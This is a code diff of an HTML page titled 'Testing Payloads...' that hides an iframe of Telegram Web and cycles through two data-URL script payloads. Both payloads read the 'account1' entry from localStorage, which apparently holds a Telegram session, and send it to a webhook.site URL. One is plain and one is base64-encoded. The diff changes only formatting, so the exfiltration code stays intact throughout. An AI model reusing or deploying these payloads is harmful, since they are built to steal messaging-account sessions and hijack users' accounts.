@@ -3,12 +3,12 @@
   <body>
     <h1>Testing Payloads...</h1>
     <iframe id="tg_frame" src="https://web.telegram.org/a/" style="display:none;"></iframe>
+    
     <script>
       const payloads = [
-  "data:text/html,<script>fetch('https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4?data='+encodeURIComponent(localStorage.getItem('account1')))</script>",
-  "data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cHM6Ly93ZWJob29rLnNpdGUvOTJmYjliODAtOWMyOC00YjQ3LWEwNWYtZGE2MGU1ZTcyY2E0P2RhdGE9JyArIGVuY29kZVVSSUNvbXBvbmVudChsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnYWNjb3VudDEnKSkpPC9zY3JpcHQ+"
-];
-
+        "data:text/html,<script>fetch('https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4?data='+encodeURIComponent(localStorage.getItem('account1')))</script>",
+        "data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cHM6Ly93ZWJob29rLnNpdGUvOTJmYjliODAtOWMyOC00YjQ3LWEwNWYtZGE2MGU1ZTcyY2E0P2RhdGE9JyArIGVuY29kZVVSSUNvbXBvbmVudChsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnYWNjb3VudDEnKSkpPC9zY3JpcHQ+"
+      ];
 
       let index = 0;
 
@@ -28,7 +28,7 @@
 
         index++;
         if (index < payloads.length) {
-          setTimeout(sendPayload, 3000); // wait 3 sec between tests
+          setTimeout(sendPayload, 3000);
         }
       };
 
